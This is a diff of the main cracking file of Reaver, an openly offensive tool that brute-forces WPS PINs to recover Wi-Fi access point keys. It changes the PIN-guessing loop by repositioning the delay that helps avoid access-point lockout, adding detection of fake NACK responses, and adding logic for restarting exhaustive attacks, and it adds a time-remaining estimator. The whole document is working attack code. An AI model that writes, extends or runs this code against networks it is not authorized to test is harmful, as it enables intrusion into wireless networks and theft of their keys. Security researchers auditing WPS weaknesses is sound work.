@@ -1,6 +1,7 @@
 /*
  * Reaver - Main cracking functions
  * Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+ * Copyright (c) 2016, Koko Software, Adrian Warecki <bok@kokosoftware.pl>
  *
  *  This program is free software; you can redistribute it and/or modify
  *  it under the terms of the GNU General Public License as published by
@@ -32,6 +33,7 @@
  */
 
 #include "cracker.h"
+#include "globule.h"
 
 time_t last_display = 0;
 int last_attempts = 0;
@@ -39,9 +41,9 @@ int last_attempts = 0;
 /* Brute force all possible WPS pins for a given access point */
 void crack()
 {
-    unsigned char *bssid = NULL;
+    char *bssid = NULL;
     char *pin = NULL;
-    int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
+    int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0, pin_attempts = 0;
     time_t start_time = 0;
     enum wps_result result = 0;
 
@@ -78,7 +80,6 @@ void crack()
          */
         cprintf(INFO, "[+] Waiting for beacon from %s\n", bssid);
         read_ap_beacon();
-        process_auto_options();
 
         /* I'm fairly certian there's a reason I put this in twice. Can't remember what it was now though... */	
         if(get_max_pin_attempts() == -1)
@@ -124,11 +125,6 @@ void crack()
         /* Main cracking loop */
         for(loop_count=0, sleep_count=0; get_key_status() != KEY_DONE; loop_count++, sleep_count++)
         {
-            /* 
-             * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
-             * registrar requests. Using a delay here can help prevent the AP from locking us out.
-             */
-            pcap_sleep(get_delay());
 
             /* Users may specify a delay after x number of attempts */
             if((get_recurring_delay() > 0) && (sleep_count == get_recurring_delay_count()))
@@ -166,7 +162,7 @@ void crack()
             }
             else
             {
-                cprintf(WARNING, "[+] Trying pin %s.\n", pin);
+                cprintf(WARNING, "[+] Trying pin %s\n", pin);
             }
 
             /* 
@@ -194,6 +190,24 @@ void crack()
              */
             result = do_wps_exchange();
 
+            /*
+             * The WPA key and other settings are stored in the globule->wps structure. If we've
+             * recovered the WPS pin and parsed these settings, don't free this structure. It
+             * will be freed by wpscrack_free() at the end of main().
+             */
+            if(get_key_status() != KEY_DONE)
+            {
+                // We have to free wps, before making any call to pcap_sleep! Otherwise we should except Segmentation fault on SIGINT.
+                wps_deinit(get_wps());
+                set_wps(NULL);
+            }
+            /* If we have cracked the pin, save a copy */
+            else
+            {
+                set_pin(pin);
+            }
+
+
             switch(result)
             {
                 /* 
@@ -204,10 +218,16 @@ void crack()
                 case KEY_REJECTED:
                     fail_count = 0;
                     advance_pin_count();
+                    pin_attempts++;
                     cprintf(WARNING, "[+] Pin count advanced: %i. Max pin attempts: %i\n", get_pin_count(), get_max_pin_attempts());
                     break;
                     /* Got it!! */
                 case KEY_ACCEPTED:
+                    break;
+                case FAKE_NACK:
+                    cprintf(WARNING, "[!] WARNING: Fake NACK detected, waiting %d seconds before re-checking\n", get_fake_nack_delay());
+                    pcap_sleep(get_fake_nack_delay());
+                    fail_count = 0;
                     break;
                     /* Unexpected timeout or EAP failure...try this pin again */
                 default:
@@ -233,37 +253,20 @@ void crack()
             }
 
             /* 
-             * The WPA key and other settings are stored in the globule->wps structure. If we've 
-             * recovered the WPS pin and parsed these settings, don't free this structure. It 
-             * will be freed by wpscrack_free() at the end of main().
+             * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
+             * registrar requests. Using a delay here can help prevent the AP from locking us out.
              */
             if(get_key_status() != KEY_DONE)
-            {
-                wps_deinit(get_wps());
-                set_wps(NULL);
-            }
-            /* If we have cracked the pin, save a copy */
-            else
-            {
-                set_pin(pin);
-            }
+                pcap_sleep(get_delay());
+
             free(pin);
             pin = NULL;
 
             /* If we've hit our max number of pin attempts, quit */
-            if((get_max_pin_attempts() > 0) && 
-                    (get_pin_count() == get_max_pin_attempts()))
+            if (get_cracking_done() || (pin_attempts == get_quit_pin_attempts()) )
             {
-                if(get_exhaustive()){
-                    cprintf(WARNING, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
-                    break;
-                }
-                else
-                {
-                    cprintf(WARNING, "[+] Checksum mode was not successful. Starting exhaustive attack\n");
-                    set_exhaustive(1);
-                    set_p2_index(0);
-                }
+                cprintf(WARNING, "[+] Quitting after %d crack attempts\n", pin_attempts);
+                break;
             }
         }
 
@@ -311,7 +314,99 @@ int get_pin_count()
     return pin_count;
 }
 
-/* Displays the status and rate of cracking */
+/* Return non zero to quit reaver. */
+int get_cracking_done()
+{
+            if(get_key_status() == KEY1_WIP)
+            {
+                if (get_pin_count() == P1_SIZE)
+                {
+                    if(get_exhaustive()){
+                        cprintf(WARNING, "[+] First half of pin was not found. Restarting attack.\n");
+                        set_p1_index(0);
+                        return 0;
+                    }
+                    else
+                    {
+                        return 1;
+                    }
+                }
+            }
+            else if(get_key_status() == KEY2_WIP)
+            {
+                if( (get_max_pin_attempts() > 0) && (get_pin_count() == get_max_pin_attempts()) )
+                {
+                    /* Exhaustive mode isn't enabled. */
+                    if(get_exhaustive() == 0)
+                    {
+                        cprintf(WARNING, "[+] Checksum mode was not successful. Starting exhaustive attack\n");
+                        set_exhaustive(2);
+                        set_p2_index(0);
+                        return 0;
+                    } else
+                    /* User activated exhaustive mode. */
+                    if(get_exhaustive() == 1)
+                    {
+                        cprintf(WARNING, "[+] Second half of pin was not found. Restarting attack.\n");
+                        set_p2_index(0);
+                        return 0;
+                    } else
+                    /* Automatic exhaustive mode. */
+                    if (get_exhaustive() == 2)
+                    {
+                        return 1;
+                    }
+                }
+            }
+    return 0;
+}
+
+char *get_max_time_remaining(int average, int attempts_remaining)
+{
+	char *max_time, hours[8], minutes[3], seconds[3];
+	int max_hours = 0, max_minutes = 0, max_seconds = 0;
+
+	max_time = malloc(16);
+
+	if(!max_time)
+		exit(-1);
+
+	if(average)
+	{
+		max_seconds = attempts_remaining * average;
+		if(max_seconds > 60)
+		{
+			max_minutes = max_seconds / 60;
+			max_seconds -= max_minutes * 60;
+		}
+		if(max_minutes > 60)
+		{
+			max_hours = max_minutes / 60;
+			max_minutes -= max_hours * 60;
+		}
+
+		if(max_seconds < 0 || max_minutes < 0 || max_hours < 0)
+		{
+			free(max_time);
+			return NULL;
+		}
+
+		sprintf(hours, "%d", max_hours);
+		sprintf(minutes, "%s%d", max_minutes > 9 ? "" : "0", max_minutes);
+		sprintf(seconds, "%s%d", max_seconds > 9 ? "" : "0", max_seconds);
+
+		sprintf(max_time, "%s:%s:%s", hours, minutes, seconds);
+	}
+	else
+	{
+		free(max_time);
+		return NULL;
+	}
+
+	return max_time;
+}
+
+//Displays the status and rate of cracking
 void display_status(time_t start_time)
 {
     float percentage = 0;
@@ -323,10 +418,8 @@ void display_status(time_t start_time)
     {
         attempts = get_p1_index() + get_p2_index();
     }
-    /* 
-     * If we've found the first half of the key, then the entire key1 keyspace
-     * has been exhausted/eliminated. Our output should reflect that.
-     */
+     // If we've found the first half of the key, then the entire key1 keyspace
+     // has been exhausted/eliminated. Our output should reflect that. 
     else if(get_key_status() == KEY2_WIP)
     {
         attempts = P1_SIZE + get_p2_index();
